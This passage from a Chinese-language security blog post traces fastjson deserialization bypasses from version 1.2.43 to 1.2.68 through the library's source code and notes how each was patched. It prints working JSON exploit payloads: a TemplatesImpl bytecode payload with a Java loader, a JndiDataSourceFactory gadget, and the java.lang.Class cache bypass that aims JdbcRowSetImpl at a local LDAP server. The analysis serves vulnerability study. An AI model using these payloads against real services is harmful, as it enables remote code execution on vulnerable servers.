class="code"><pre><span class="line">package fastjson1_2_43;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class TemplateImplTest &#123;</span><br><span class="line">    public static void main(String args[]) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 开启 AutoTypeSupport</span><br><span class="line">            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line"></span><br><span class="line">            byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\FastjsonTest\\target\\classes\\pojo\\Eval.class&quot;));</span><br><span class="line">            String base64Code = Base64.getEncoder().encodeToString(code);</span><br><span class="line">            String text1 = &quot;&#123;&quot; +</span><br><span class="line">                    &quot;\&quot;@type\&quot;: \&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot; +</span><br><span class="line">                    &quot;\&quot;_bytecodes\&quot;: [\&quot;&quot; + base64Code + &quot;\&quot;],&quot; +</span><br><span class="line">                    &quot;\&quot;_name\&quot;: \&quot;miaoji\&quot;,&quot; +</span><br><span class="line">                    &quot;\&quot;_tfactory\&quot;: &#123;&#125;,&quot; +</span><br><span class="line">                    &quot;\&quot;_outputProperties\&quot;: &#123;&#125;,&quot; +</span><br><span class="line">                    &quot;&#125;&quot;;</span><br><span class="line">            System.out.println(text1);</span><br><span class="line"></span><br><span class="line">            JSON.parseObject(text1, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">            // JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行后会报错：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913142449126.png">
+
+<p>报错信息显示：某个位置需要一个 <code>[</code> ，但是却给了一个 <code>,</code> ，在 position 72 ，大概是第 72 个字符的意思。刚好是类名后面那个逗号，那就在这里加个 <code>[</code> 。</p>
+<p>报错位置在 DefaultJSONParser.parseArray ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913142954488.png">
+
+<p>加上 <code>[</code> 后再次运行，还是报错：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913143127325.png">
+
+<p>position 73 需要一个 <code>&#123;</code> ，就是前面加上的 <code>[</code> 后面一个的位置，就再把它加上，这次运行成功了。</p>
+<p>payload 就长这个样子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;[&#123;,</span><br><span class="line">    &quot;_bytecodes&quot;: [base64Code],</span><br><span class="line">    &quot;_name&quot;: &quot;miaoji&quot;,</span><br><span class="line">    &quot;_tfactory&quot;: &#123;&#125;,</span><br><span class="line">    &quot;_outputProperties&quot;: &#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="fastjson-1-2-44"><a href="#fastjson-1-2-44" class="headerlink" title="fastjson 1.2.44"></a>fastjson 1.2.44</h3><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.44</code> </p>
+<p>fastjson 1.2.44 版本不但修复了上个版本 <code>[</code> 开头导致的绕过问题，而且只要是 <code>[</code> 开头，或是以 <code>L</code> 开头 <code>;</code> 结尾，会直接抛出异常，而不是像之前那样简单的过滤了：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913144734333.png">
+
+<p>从代码逻辑上看，第一个 if 判断是否以 <code>[</code> 开头，第二个 if 判断了是否以 <code>L</code> 开头并且以 <code>;</code> 结尾。</p>
+<p>这样的话就彻底杜绝了前面的几种绕过方式，果然是舍不得孩子套不着狼啊。</p>
+<h3 id="fastjson-1-2-45"><a href="#fastjson-1-2-45" class="headerlink" title="fastjson 1.2.45"></a>fastjson 1.2.45</h3><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.45</code> </p>
+<p>1.2.45 版本曝出了新的可绕过黑名单的类 org.apache.ibatis.datasource.jndi.JndiDataSourceFactory ，这个类需要服务端有 mybatis 依赖 jar 包。</p>
+<p>可以在我们的项目下手动添加一个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.5.13&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload 如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:10389/Command8&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>事实上这个类也可以用来绕过前面所有版本的黑名单。</p>
+<p>不过在 1.2.46 版本中被加入了黑名单：</p>
+<table>
+<thead>
+<tr>
+<th>version</th>
+<th>hash</th>
+<th>hex-hash</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.46</td>
+<td>-8083514888460375884</td>
+<td>0x8fd1960988bce8b4L</td>
+<td>org.apache.ibatis.datasource</td>
+</tr>
+</tbody></table>
+<h3 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson 1.2.47"></a>fastjson 1.2.47</h3><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.32</code> 未开启 AutoTypeSupport 以及 <code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code> 。</p>
+<p>ParserConfig 的 checkAutoType 方法中有一个机制其实在之前的版本中已经有了，只是我们在研究的时候选择性忽略了而已。而这个利用方式在 1.2.47 版本被曝出来。</p>
+<p>这个特性就是如果在黑白名单中没有找到匹配的类，会尝试在 TypeUtils 的 mappings 属性和 deserializers 中查找，如果能找到的话可以直接返回：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913162820916.png">
+
+<p>在 autoTypeSupport 为 true 的情况下，会进入前面的判断机制，但就算这个类在黑名单中，只要 TypeUtils 的 mappings 属性中能找到这个类，也不会抛出异常：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913163732527.png">
+
+<p>如果 autoTypeSupport 为 false ，那就更是畅通无阻了。于是就给了我们利用空间。</p>
+<p>接下来的问题就是如何将类加载进 TypeUtils.mappings 或者是 ParserConfig.deserializers 。</p>
+<h4 id="将类加载进-TypeUtils-mappings"><a href="#将类加载进-TypeUtils-mappings" class="headerlink" title="将类加载进 TypeUtils.mappings"></a>将类加载进 TypeUtils.mappings</h4><p>先来看 TypeUtils.mappings ，能将其赋值的方法有 addBaseClassMappings() ，loadClass(Stringe, ClassLoader, boolean)。</p>
+<p>addBaseClassMappings() 中是对一些基本类型的赋值，没有什么操作空间：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913170010985.png">
+
+<p>那么看 TypeUtils#loadClass(Stringe, ClassLoader, boolean)，可以看到，只要传入的 cache 不为空，就可以将传入的 className put 进 mappings 中：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913171908677.png">
+
+<p>在 TypeUtils 中，loadClass(Stringe, ClassLoader, boolean) 只有一处被调用，就是两个参数的重写方法 loadClass(String, ClassLoader )：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913172240384.png">
+
+<p>并且这里默认会将 cache 设置为 true 。</p>
+<p>其实还有个一参重写方法调用了这个两参重写方法，但是它会将 classLoader 设置为空，而在三参重写方法中是要用到这个 classLoader 的，所以不考虑：</p>
+ <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913172929672.png">
+
+<p>向上找两参的 loadClass 方法在哪被调用。</p>
+<p>关注 com.alibaba.fastjson.serializer.MiscCodec#deserialze 方法，如果方法传入的参数 clazz 为 Class.class ，那么会调用两参的 loadClass 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240914085706195.png">
+
+<p>这里传入的第一个参数是 strVal ，作为类名。往上看看 strVal 在哪被赋值：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240914091152570.png">
+
+<p>显然是被 objVal 赋值，描述类名用字符串，我没意见。</p>
+<p>再往前看 objVal ，如果 parser.resolveStatus 是 DefaultJSONParser.TypeNameRedirect 的话，就能给 objVal 赋值了：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240914091314887.png">
+
+<p>parser 也是传进来的参数，parser.parse() 这里面的调用链我就不分析了，简单总结一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DefaultJSONParser#parse()</span><br><span class="line">DefaultJSONParser#parse(Object)</span><br><span class="line">JSONScanner#stringVal()</span><br><span class="line">JSONScanner#subString(int, int)</span><br></pre></td></tr></table></figure>
+
+<p>JSONScanner#subString(int, int)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240914105410783.png">
+
+<p>从 text 中取子串，至于取子串的位置早就设定好了，其实取的是 json 字符串的键名为 val 所对应的值。但是为什么从一开始就这么设定好了呢，这就不得不提到 lexer 这个 JSONScanner 扫描器对象了。</p>
+<h4 id="JSONScanner-扫描器"><a href="#JSONScanner-扫描器" class="headerlink" title="JSONScanner 扫描器"></a>JSONScanner 扫描器</h4><p>早在 JSON#parse 方法创建 DefaultJSONParser 对象的时候就创建了这个 JSONScanner 对象：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240914110613836.png">
+
+<p>跟进去看构造方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240914110912950.png">
+
+<p>注意这里的 input 就是我们最初传入的 json 字符串。在 JSONScanner 的构造方法中被赋值到 JSONScanner 对象的 text 属性中：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240914111737715.png">
+
+<p>那么 text 的赋值搞清楚了。看 JSONScanner#stringVal() ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240914112022431.png">
+
+<p>这其中代表起始地址与长度的 np、sp 又是在何处赋值呢？</p>
+<p>其实是 lexer.nextToken() 方法在改变 np、sp 的值，也就是 JSONScanner 的父类 JSONLexerBase 的 nextToken() 方法。</p>
+<p>nextToken 会将 JSON 中的<strong>键</strong>或<strong>值</strong>解析成独立的词法单元。例如，在解析 JSON 对象 <code>&#123;&quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30&#125;</code> 时，<code>nextToken</code> 依次识别并解析以下词法单元：</p>
+<ul>
+<li><code>&#123;</code>：表示对象的开始，词法单元类型为 <code>LBRACE</code></li>
+<li><code>&quot;name&quot;</code>：字符串类型的键，词法单元类型为 <code>STRING</code></li>
+<li><code>:</code>：表示键和值的分隔符，词法单元类型为 <code>COLON</code></li>
+<li><code>&quot;John&quot;</code>：字符串类型的值，词法单元类型为 <code>STRING</code></li>
+<li><code>,</code>：表示下一个键值对的开始，词法单元类型为 <code>COMMA</code></li>
+<li><code>&quot;age&quot;</code>：字符串类型的键，词法单元类型为 <code>STRING</code></li>
+<li><code>:</code>：表示键和值的分隔符，词法单元类型为 <code>COLON</code></li>
+<li><code>30</code>：数字类型的值，词法单元类型为 <code>NUMBER</code></li>
+<li><code>&#125;</code>：表示对象的结束，词法单元类型为 <code>RBRACE</code></li>
+</ul>
+<p>当 nextToken 方法识别到一个词法单元后，词法分析器（lexer）将准备好为下一个 nextToken 调用解析下一个词法单元。</p>
+<p>回过头看 MiscCodec#deserialze(DefaultJSONParser, Type, Object)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240914144929076.png">
+
+<p>在做判断的时候判断当前词法单元是不是 “val” ，不是的话会抛出异常，是的话调用 nextToken ，假如 json 数据的格式是：<code>&#123;&quot;val&quot;:&quot;aaaaa&quot;&#125;</code> 这样的形式，调用 nextToken 之后，当前的词法单元就是 <code>:</code> 了。</p>
+<p>然后调用 parser.accept ，这里面其实也调用了 nextToken ，并且在调用之前会检查当前的词法单元是不是 <code>:</code> ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240914145325608.png">
+
+<p>那么这个 nextToken 调用完之后，当前的词法单元就是 “val” 键对应的值了。所以 objVal 获取到的就是 val 键对应的值。</p>
+<h4 id="ParserConfig-deserializers-的初始化"><a href="#ParserConfig-deserializers-的初始化" class="headerlink" title="ParserConfig.deserializers 的初始化"></a>ParserConfig.deserializers 的初始化</h4><p>现在回到最初的那个问题：如何将类加载进 TypeUtils.mappings 或者是 ParserConfig.deserializers 。</p>
+<p>接下来看看能否将类加载进 ParserConfig.deserializers 中，但是不能，deserializers 是 ParserConfig 的一个成员属性，定义的时候就初始化好了，并且只有在 ParserConfig#initDeserializers() 中才有添加的操作：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240914153242461.png">
+
+<p>都是硬编码写好的，没有操作空间，所以不考虑。不过其中有一条，Class 类也在这个里面，这就意味着，如果反序列化的是 java.lang.Class 类，那么它能顺利通过 checkAutoType 的检测。</p>
+<h4 id="剩余利用链分析"><a href="#剩余利用链分析" class="headerlink" title="剩余利用链分析"></a>剩余利用链分析</h4><p>DefaultJSONParser#parseObject(final Map, Object) 方法在遇到 Class 这样的类时，会调用 MiscCodec 类来反序列化它们，并且前面还会设置好 resolveStatus 为 TypeNameRedirect ，这就满足了 MiscCodec#deserialze 中给 objVal 赋值的条件：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240914155926713.png">
+
+<p>DefaultJSONParser#parseObject(final Map, Object) 这个方法很有意思，遇到不同的类还会调用不同的类来处理它，比如遇到 Class 类调用 MiscCodec 类来反序列化，这应该就是在前面的 ParserConfig#initDeserializers() 中指定的。</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>这部分思路理清了之后，给出一个 payload ：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;object1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;object2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:10389/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>反序列化第一个类时，Class 能顺利通过 checkAutoType 的检查并返回，随后进入 MiscCodec#deserialze 中将 “com.sun.rowset.JdbcRowSetImpl” 字符串加载进 TypeUtils.mappings 。</p>
+<p>反序列化第二个类的时候，由于 TypeUtils.mappings 中存在 “com.sun.rowset.JdbcRowSetImpl” ，即使黑名单匹配到了也不会抛出异常，并且能够成功返回。</p>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>1.2.48 版本对这种利用方式进行了修复，首先就是将 TypeUtils 的两参 loadClass 方法调用三参方法时的 cache 默认设置为 false ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240917152927051.png">
+
+<p>这样就没有办法将类加载进 TypeUtils.mappings 了。</p>
+<p>另一个更改的点就是 MiscCodec#deserialze(DefaultJSONParser, Type, Object) 直接调用 TypeUtils 的三参 loadClass 方法，并且将 cache 设置为 false ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240917153627744.png">
+
+<p>最后一个点就是似乎将 java.lang.Class 类加入黑名单了，当我调试到 ParserConfig#checkAutoType 时，第一次进入就直接抛出异常：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240917154257933.png">
+
+<p>大概是将 java.lang.Class 类加入黑名单了。</p>
+<h3 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson 1.2.68"></a>fastjson 1.2.68</h3><p>影响版本：<code>fastjson &lt;= 1.2.68</code> </p>
+<p>fastjson 1.2.68 版本在 ParserConfig 中新增了一个 safeMode 安全机制。在其 checkAutoType 方法中：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240917155422586.png">
+
+<p>只要当前开启了安全模式 safeMode ，那么就会直接抛出异常，任何类都不能通过检查，那么就不能反序列化任何类。</p>
+<p>另外，在 1.2.68 版本出现了一种新的绕过方式，利用点在 checkAutoType 方法的这个位置，如果能构造一个符合条件的 expectClass ，即要反序列化的类是传入的 expectClass 的子类，那么就能通过 checkAutoType 的检查：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240917161426258.png">
+
+<p>当然这是在 safeMode 关闭的前提下才能利用。其实这个点在过往的版本中也都有，只是利用方式在 1.2.68 版本才发现而已。</p>
+<p>expectClass 是三参 checkAutoType 方法的参数：</p>
